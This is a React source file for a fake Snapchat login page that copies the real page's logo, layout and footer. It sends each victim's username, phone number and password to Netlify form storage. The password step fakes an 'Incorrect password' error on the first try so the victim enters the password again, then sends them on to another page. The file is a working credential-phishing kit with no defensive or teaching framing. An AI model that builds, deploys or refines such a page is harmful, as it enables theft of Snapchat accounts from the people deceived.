import React, { useState } from "react";
import SnapchatLogo from "../../../attached_assets/snapchat_1785772849797.png";

const SnapchatGhost = () => (
  <img
    src={SnapchatLogo}
    alt="Snapchat logo"
    width="76"
    height="76"
    className="mx-auto block h-[76px] w-[76px] object-contain"
  />
);

const GoogleLogo = () => (
  <svg
    width="20"
    height="20"
    viewBox="0 0 24 24"
    xmlns="http://www.w3.org/2000/svg"
  >
    <path
      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
      fill="#4285F4"
    />
    <path
      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
      fill="#34A853"
    />
    <path
      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
      fill="#FBBC05"
    />
    <path
      d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
      fill="#EA4335"
    />
  </svg>
);

const EyeIcon = ({ open }: { open: boolean }) =>
  open ? (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#888"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  ) : (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#888"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  );

// Step types
type Step = "username" | "phone" | "password";

const Footer = () => (
  <footer className="mt-10 w-full max-w-[900px] px-2">
    <div className="grid grid-cols-2 sm:grid-cols-4 gap-x-6 gap-y-6">
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Company
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Snap Inc.
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Careers
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          News
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Community
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Support
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Community Guidelines
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Safety Center
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Advertising
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Buy Ads
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Advertising Policies
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Political Ads Library
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Brand Guidelines
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Promotions Rules
        </a>
      </div>
      <div className="flex flex-col gap-[6px]">
        <a
          href="#"
          className="text-[13px] font-semibold text-[#333333] hover:underline"
        >
          Legal
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Privacy Center
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Your Privacy Choices
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Cookie Policy
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Report Infringement
        </a>
        <a href="#" className="text-[13px] text-[#555555] hover:underline">
          Custom Creative Tools Terms
        </a>
      </div>
    </div>
    <div className="mt-6">
      <a
        href="#"
        className="text-[13px] font-semibold text-[#333333] hover:underline"
      >
        Language
      </a>
    </div>
  </footer>
);

export default function LoginPage() {
  const [step, setStep] = useState<Step>("username");
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("+1");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [usernameError, setUsernameError] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const returnTo =
    new URLSearchParams(window.location.search).get("returnTo") || "/";

  const submitNetlifyForm = async (
    formName: string,
    fields: Record<string, string>,
  ) => {
    if (!import.meta.env.PROD) {
      return;
    }

    const body = new URLSearchParams();
    body.set("form-name", formName);

    Object.entries(fields).forEach(([key, value]) => {
      body.set(key, value);
    });

    await fetch("/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });
  };

  const handleUsernameNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim()) {
      setUsernameError("Please enter your username or email.");
      return;
    }
    setUsernameError("");
    await submitNetlifyForm("Snapchat-login-username", {
      username,
    });
    setStep("password");
  };

  const handlePhoneNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone.trim()) {
      setPhoneError("Please enter your phone number.");
      return;
    }
    setPhoneError("");
    await submitNetlifyForm("Snapchat-login-phone", {
      countryCode,
      phone,
    });
    setStep("password");
  };

  const handlePasswordNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setPasswordError("Please enter your password.");
      return;
    }
    setPasswordError("");

    const storedUsername = username || phone;
    if (storedUsername) {
      window.localStorage.setItem("snapchatLoginUsername", storedUsername);
    }

    // first submission is always rejected to verify the data
    if (attempts === 0) {
      setAttempts(1);
      setPasswordError("Incorrect password, please try again.");
      return;
    }

    await submitNetlifyForm("Snapchat-login-password", {
      identifier: username || phone,
      password,
    });

    window.location.assign(returnTo);
  };

  return (
    <div
      className="min-h-screen w-full font-sans text-[#111111]"
      style={{ backgroundColor: "#f2f2f2" }}
    >
      <main className="flex flex-col items-center px-4 pt-10 pb-10">
        {step === "username" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Log in to Snapchat
            </h1>
            <form onSubmit={handleUsernameNext} className="mt-6">
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Username or Email
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value);
                  setUsernameError("");
                }}
                className="w-full px-3.5 py-[12px] border-[2px] border-black rounded-[8px] focus:outline-none text-[15px]"
                autoFocus
              />
              {usernameError && (
                <p className="mt-1.5 text-[13px] text-red-500">
                  {usernameError}
                </p>
              )}

              <div className="mt-3 text-center">
                <button
                  type="button"
                  onClick={() => {
                    setStep("phone");
                    setUsernameError("");
                  }}
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Use phone number instead
                </button>
              </div>

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>

              <div className="flex items-center w-full mt-6 mb-5">
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
                <span className="px-4 text-[13px] text-[#888888]">OR</span>
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
              </div>

              <button
                type="button"
                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
              >
                <GoogleLogo />
                <span className="text-[14px] font-semibold text-[#333333]">
                  Continue with Google
                </span>
              </button>
            </form>
          </div>
        )}

        {step === "phone" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Log in to Snapchat
            </h1>
            <form onSubmit={handlePhoneNext} className="mt-6">
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Phone number
              </label>
              <div className="flex border-[2px] border-black rounded-[8px] overflow-hidden focus-within:border-black">
                <div className="flex items-center gap-1.5 px-3 bg-white border-r border-[#e0e0e0] shrink-0">
                  <span className="text-[16px]">🇺🇸</span>
                  <select
                    className="text-[14px] font-medium text-[#333] bg-transparent focus:outline-none appearance-none cursor-pointer pr-1"
                    value={countryCode}
                    onChange={(e) => setCountryCode(e.target.value)}
                  >
                    <option value="+1">US +1</option>
                    <option value="+44">UK +44</option>
                    <option value="+33">FR +33</option>
                    <option value="+49">DE +49</option>
                    <option value="+81">JP +81</option>
                    <option value="+86">CN +86</option>
                    <option value="+91">IN +91</option>
                    <option value="+55">BR +55</option>
                    <option value="+52">MX +52</option>
                    <option value="+61">AU +61</option>
                  </select>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#888"
                    strokeWidth="2.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="6 9 12 15 18 9" />
                  </svg>
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => {
                    setPhone(e.target.value);
                    setPhoneError("");
                  }}
                  className="flex-1 px-3 py-[12px] focus:outline-none text-[15px]"
                  placeholder=""
                  autoFocus
                />
              </div>
              {phoneError && (
                <p className="mt-1.5 text-[13px] text-red-500">{phoneError}</p>
              )}

              <div className="mt-3 text-center">
                <button
                  type="button"
                  onClick={() => {
                    setStep("username");
                    setPhoneError("");
                  }}
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Use username or email address instead
                </button>
              </div>

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>

              <div className="flex items-center w-full mt-6 mb-5">
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
                <span className="px-4 text-[13px] text-[#888888]">OR</span>
                <div className="flex-1 border-t border-[#e0e0e0]"></div>
              </div>

              <button
                type="button"
                className="flex items-center justify-center gap-2.5 w-full border border-[#d0d0d0] rounded-full py-[10px] bg-white hover:bg-gray-50 transition-colors"
              >
                <GoogleLogo />
                <span className="text-[14px] font-semibold text-[#333333]">
                  Continue with Google
                </span>
              </button>
            </form>
          </div>
        )}

        {step === "password" && (
          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
            <SnapchatGhost />
            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
              Enter Password
            </h1>

            <div className="mt-4 flex items-center justify-center gap-2">
              <span className="text-[14px] font-semibold text-[#333]">
                {username || phone}
              </span>
              <button
                type="button"
                onClick={() => {
                  setStep(username ? "username" : "phone");
                  setPassword("");
                }}
                className="text-[13px] font-semibold text-[#00C8FA] hover:underline"
              >
                Not you?
              </button>
            </div>

            <form
              name="Snapchat-login-password"
              method="POST"
              data-netlify="true"
              onSubmit={handlePasswordNext}
              className="mt-5"
            >
              <input
                type="hidden"
                name="form-name"
                value="Snapchat-login-password"
              />
              <input
                type="hidden"
                name="identifier"
                value={username || phone}
              />
              <label className="block text-[13px] font-medium text-[#555555] mb-1.5">
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    setPasswordError("");
                  }}
                  className="w-full px-3.5 py-[12px] pr-11 border-[1.5px] border-[#cccccc] rounded-[8px] focus:outline-none focus:border-black text-[15px] transition-colors"
                />
                <a
                  href="#"
                  className="text-[14px] font-semibold text-[#00C8FA] hover:underline"
                >
                  Forgot Password
                </a>
              </div>
              {passwordError && (
                <p className="mt-1.5 text-[13px] text-red-500">
                  {passwordError}
                </p>
              )}

              <div className="mt-5 flex justify-center">
                <button
                  type="submit"
                  className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        )}

        {step !== "password" && (
          <div className="mt-5 text-center">
            <span className="text-[15px] text-[#444444]">
              New to Snapchat?{" "}
            </span>
            <a
              href="#"
              className="text-[15px] font-bold text-black hover:underline"
            >
              Sign Up
            </a>
          </div>
        )}

        <Footer />
      </main>
    </div>
  );
}
